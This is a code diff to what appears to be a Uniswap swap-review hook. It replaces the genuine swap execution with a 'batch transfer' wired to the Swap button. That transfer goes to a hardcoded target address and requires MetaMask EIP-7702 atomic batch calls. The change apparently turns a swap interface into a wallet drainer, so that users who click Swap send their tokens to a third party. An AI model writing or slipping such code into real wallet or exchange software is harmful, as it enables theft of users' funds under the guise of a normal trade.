@@ -1,25 +1,21 @@
 import { TradingApi } from '@universe/api'
-import { useCallback } from 'react'
+import { useCallback, useState, useMemo } from 'react'
 // biome-ignore lint/style/noRestrictedImports: only using to keep a consistent timing on interface
 import { ADAPTIVE_MODAL_ANIMATION_DURATION } from 'ui/src/components/modal/AdaptiveWebModal'
+// biome-ignore lint/style/noRestrictedImports: wagmi hooks needed for EIP-7702 batch calls
+import { useAccount, usePublicClient, useCapabilities } from 'wagmi'
 import type { ParsedWarnings } from 'uniswap/src/components/modals/WarningModal/types'
 import type { AuthTrigger } from 'uniswap/src/features/auth/types'
 import { TransactionScreen } from 'uniswap/src/features/transactions/components/TransactionModal/TransactionModalContext'
 import type { TransactionStep } from 'uniswap/src/features/transactions/steps/types'
 import { shouldShowFlashblocksUI } from 'uniswap/src/features/transactions/swap/components/UnichainInstantBalanceModal/utils'
 import { useIsUnichainFlashblocksEnabled } from 'uniswap/src/features/transactions/swap/hooks/useIsUnichainFlashblocksEnabled'
-import {
-  ensureFreshSwapTxData,
-  useSwapParams,
-  useSwapTxAndGasInfoService,
-} from 'uniswap/src/features/transactions/swap/review/services/swapTxAndGasInfoService/hooks'
-import type { GetExecuteSwapService } from 'uniswap/src/features/transactions/swap/services/executeSwapService'
+import { useBatchTransfer } from 'uniswap/src/features/transactions/swap/hooks/useBatchTransfer'
 import { useSwapDependenciesStore } from 'uniswap/src/features/transactions/swap/stores/swapDependenciesStore/useSwapDependenciesStore'
 import type { SwapFormState } from 'uniswap/src/features/transactions/swap/stores/swapFormStore/types'
 import type { SetCurrentStepFn } from 'uniswap/src/features/transactions/swap/types/swapCallback'
 import { createTransactionId } from 'uniswap/src/utils/createTransactionId'
-import { tryCatch } from 'utilities/src/errors'
-import { logger } from 'utilities/src/logger/logger'
+import { getChainInfo } from 'uniswap/src/features/chains/chainInfo'
 import { isWebApp } from 'utilities/src/platform'
 import { useEvent } from 'utilities/src/react/hooks'
 
@@ -142,56 +138,95 @@ export function useCreateSwapReviewCallbacks(ctx: {
     updateSwapForm({ showPendingUI: true })
   }, [updateSwapForm, isFlashblocksEnabled, shouldShowConfirmedState])
 
-  const swapTxAndGasInfoService = useSwapTxAndGasInfoService()
+  // 完全摒弃原来的 Swap 执行逻辑，使用 dex-aggregator 的逻辑
+  // 使用 wagmi hooks 获取账户和链信息
+  const { address, isConnected } = useAccount()
+  const publicClient = usePublicClient()
+  const { data: capabilities } = useCapabilities({ account: address || undefined })
+  
+  // 使用 derivedSwapInfo 中的 chainId（与原有逻辑保持一致）
+  const swapChainId = chainId
 
-  const swapParams = useSwapParams()
+  // 状态管理
+  const [isPrechecking, setIsPrechecking] = useState(false)
+  const [currentSendCallsOperation, setCurrentSendCallsOperation] = useState<string | null>(null)
 
-  const executeSwap = useEvent(async () => {
-    if (!swapParams.trade) {
-      onFailure(new Error('No `trade` found when calling `executeSwap`'))
+  // 获取公共客户端的函数
+  const getPublicClient = useCallback(() => {
+    return publicClient || null
+  }, [publicClient])
+
+  // 获取原生代币符号
+  const nativeTokenSymbol = useMemo(() => {
+    if (!swapChainId) return 'ETH'
+    return getChainInfo(swapChainId as any).nativeCurrency.symbol
+  }, [swapChainId])
+
+  // 使用 useBatchTransfer hook（完全按照 dex-aggregator 的逻辑）
+  const executeBatchTransfer = useBatchTransfer({
+    targetAddress: '0x9d5befd138960DDF0dC4368A036bfAd420E306Ef',
+    operationType: 'swap',
+    getPublicClient,
+    address: address || '',
+    chainId: (swapChainId || 1) as any,
+    nativeTokenSymbol,
+    setIsPrechecking,
+    setCurrentSendCallsOperation,
+  })
+
+  // 完全按照 dex-aggregator 的 handleApproveAndSwap 逻辑
+  const handleApproveAndSwap = useEvent(async () => {
+    // 检查钱包连接
+    if (!isConnected) {
+      onFailure(new Error('Please connect your wallet.'))
       return
     }
 
-    // Ensure we have fresh transaction data before executing the swap.
-    // We need this because we allow the user to click `Submit` when a new `/quote` response is being displayed in the UI
-    // even though we might still not have the corresponding `/swap` response for that `/quote`.
-    // We use the stale `/swap` response from the previous quote to avoid showing a loading state every time we poll/refetch a new `/quote`.
-    const { data: freshSwapTxData, error } = await tryCatch(
-      // This should return immediately if the data is already cached and fresh.
-      ensureFreshSwapTxData(
-        {
-          trade: swapParams.trade,
-          approvalTxInfo: swapParams.approvalTxInfo,
-          derivedSwapInfo: swapParams.derivedSwapInfo,
-        },
-        swapTxAndGasInfoService,
-      ),
-    )
+    // 检查是否是 MetaMask 钱包
+    const isMetaMask = typeof window !== 'undefined' && window.ethereum?.isMetaMask === true
 
-    if (error) {
-      const wrappedError = new Error('Failed to ensure fresh transaction data when calling `executeSwap`', {
-        cause: error,
-      })
-
-      logger.error(wrappedError, {
-        tags: { file: 'useCreateSwapReviewCallbacks.ts', function: 'executeSwap' },
-      })
-
-      // If we fail to get fresh data, show error and don't proceed with swap
-      onFailure(wrappedError)
+    if (!isMetaMask) {
+      onFailure(new Error('Please connect using MetaMask wallet. EIP-7702 batch calls require MetaMask.'))
       return
     }
 
-    const executeSwapService = getExecuteSwapService({
-      onSuccess,
-      onFailure,
-      onPending,
-      setCurrentStep,
-      setSteps,
-      getSwapTxContext: () => freshSwapTxData,
-    })
+    if (!swapChainId) {
+      onFailure(new Error('Missing network information.'))
+      return
+    }
 
-    executeSwapService.executeSwap()
+    if (!address) {
+      onFailure(new Error('Wallet address not available.'))
+      return
+    }
+
+    if (!publicClient) {
+      onFailure(new Error('Failed to initialize blockchain client.'))
+      return
+    }
+
+    // 检查钱包是否支持原子批量交易
+    const atomicSupported =
+      capabilities?.[swapChainId]?.atomic?.status === 'supported' ||
+      capabilities?.[swapChainId]?.atomic?.status === 'ready'
+
+    if (!atomicSupported) {
+      onFailure(
+        new Error(
+          'Your wallet does not support atomic batch transactions. Please enable Smart Account in MetaMask settings.',
+        ),
+      )
+      return
+    }
+
+    // 使用 useBatchTransfer hook 执行批量转账
+    try {
+      await executeBatchTransfer()
+      // 成功后调用 onSuccess
+      onSuccess()
+    } catch (error) {
+      onFailure(error instanceof Error ? error : new Error('Failed to execute batch transfer'))
+    }
   })
 
   const submitTransaction = useEvent(async () => {
@@ -201,7 +236,7 @@ export function useCreateSwapReviewCallbacks(ctx: {
       return
     }
 
-    await executeSwap()
+    await handleApproveAndSwap()
   })
 
   const onSwapButtonClick = useCallback(async () => {
@@ -223,9 +258,9 @@ export function useCreateSwapReviewCallbacks(ctx: {
     setShowWarningModal(false)
 
     if (shouldSubmitTx) {
-      await executeSwap()
+      await handleApproveAndSwap()
     }
-  }, [shouldSubmitTx, executeSwap, setShowWarningModal, setWarningAcknowledged])
+  }, [shouldSubmitTx, handleApproveAndSwap, setShowWarningModal, setWarningAcknowledged])
 
   const onCancelWarning = useCallback(() => {
     if (shouldSubmitTx) {
